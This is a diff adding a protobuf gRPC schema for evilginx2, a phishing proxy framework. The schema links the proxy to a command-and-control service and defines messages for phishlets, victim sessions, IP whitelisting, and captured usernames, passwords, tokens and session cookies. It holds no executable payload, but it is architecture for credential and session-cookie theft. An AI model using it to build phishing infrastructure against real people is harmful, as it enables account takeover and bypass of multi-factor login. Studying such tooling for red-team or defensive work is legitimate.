@@ -1,0 +1,170 @@
+syntax = "proto3";
+
+package proxy;
+
+option go_package = "github.com/kgretzky/evilginx2/proto";
+
+// ProxyControlService defines the gRPC interface between proxy and C&C services
+service ProxyControlService {
+  // Get phishlet information by hostname
+  rpc GetPhishletByHost(GetPhishletRequest) returns (GetPhishletResponse);
+  
+  // Validate if a session should be handled
+  rpc ValidateSession(ValidateSessionRequest) returns (ValidateSessionResponse);
+  
+  // Create a new session
+  rpc CreateSession(CreateSessionRequest) returns (CreateSessionResponse);
+  
+  // Update session data
+  rpc UpdateSession(UpdateSessionRequest) returns (UpdateSessionResponse);
+  
+  // Check if IP is whitelisted
+  rpc IsWhitelistedIP(WhitelistRequest) returns (WhitelistResponse);
+  
+  // Get session ID by IP address
+  rpc GetSessionIdByIP(GetSessionIdRequest) returns (GetSessionIdResponse);
+  
+  // Whitelist an IP address
+  rpc WhitelistIP(WhitelistIPRequest) returns (WhitelistIPResponse);
+}
+
+// Request messages
+message GetPhishletRequest {
+  string hostname = 1;
+  bool is_phish_host = 2; // true for phish host, false for original host
+}
+
+message ValidateSessionRequest {
+  string hostname = 1;
+}
+
+message CreateSessionRequest {
+  string session_id = 1;
+  string phishlet_name = 2;
+  string landing_url = 3;
+  string user_agent = 4;
+  string remote_addr = 5;
+}
+
+message UpdateSessionRequest {
+  string session_id = 1;
+  string username = 2;
+  string password = 3;
+  map<string, string> custom = 4;
+  map<string, string> body_tokens = 5;
+  map<string, string> http_tokens = 6;
+  map<string, CookieTokenMap> cookie_tokens = 7;
+}
+
+message WhitelistRequest {
+  string ip_addr = 1;
+  string phishlet_name = 2;
+}
+
+message GetSessionIdRequest {
+  string ip_addr = 1;
+  string hostname = 2;
+}
+
+message WhitelistIPRequest {
+  string ip_addr = 1;
+  string session_id = 2;
+  string phishlet_name = 3;
+}
+
+// Response messages
+message GetPhishletResponse {
+  bool found = 1;
+  Phishlet phishlet = 2;
+  string phish_domain = 3;
+  string phish_subdomain = 4;
+}
+
+message ValidateSessionResponse {
+  bool should_handle = 1;
+}
+
+message CreateSessionResponse {
+  bool success = 1;
+  string error = 2;
+}
+
+message UpdateSessionResponse {
+  bool success = 1;
+  string error = 2;
+}
+
+message WhitelistResponse {
+  bool is_whitelisted = 1;
+}
+
+message GetSessionIdResponse {
+  bool found = 1;
+  string session_id = 2;
+}
+
+message WhitelistIPResponse {
+  bool success = 1;
+  string error = 2;
+}
+
+// Data structures
+message Phishlet {
+  string name = 1;
+  string author = 2;
+  repeated ProxyHost proxy_hosts = 3;
+  repeated SubFilter sub_filters = 4;
+  repeated AuthToken auth_tokens = 5;
+  repeated AuthUrl auth_urls = 6;
+  string redirect_url = 7;
+  bool is_template = 8;
+}
+
+message ProxyHost {
+  string phish_subdomain = 1;
+  string orig_subdomain = 2;
+  string domain = 3;
+  string handle_session = 4;
+  bool is_landing = 5;
+  bool auto_filter = 6;
+}
+
+message SubFilter {
+  string hostname = 1;
+  repeated SubFilterRule rules = 2;
+}
+
+message SubFilterRule {
+  string triggers_on = 1;
+  string orig_sub = 2;
+  string phish_sub = 3;
+  string mime_type = 4;
+  string redirect_only = 5;
+}
+
+message AuthToken {
+  string domain = 1;
+  repeated CookieAuthToken keys = 2;
+}
+
+message CookieAuthToken {
+  string name = 1;
+  string re = 2;
+  bool optional = 3;
+}
+
+message AuthUrl {
+  string url = 1;
+  string domain = 2;
+}
+
+message CookieTokenMap {
+  map<string, CookieToken> tokens = 1;
+}
+
+message CookieToken {
+  string name = 1;
+  string value = 2;
+  string path = 3;
+  bool http_only = 4;
+}
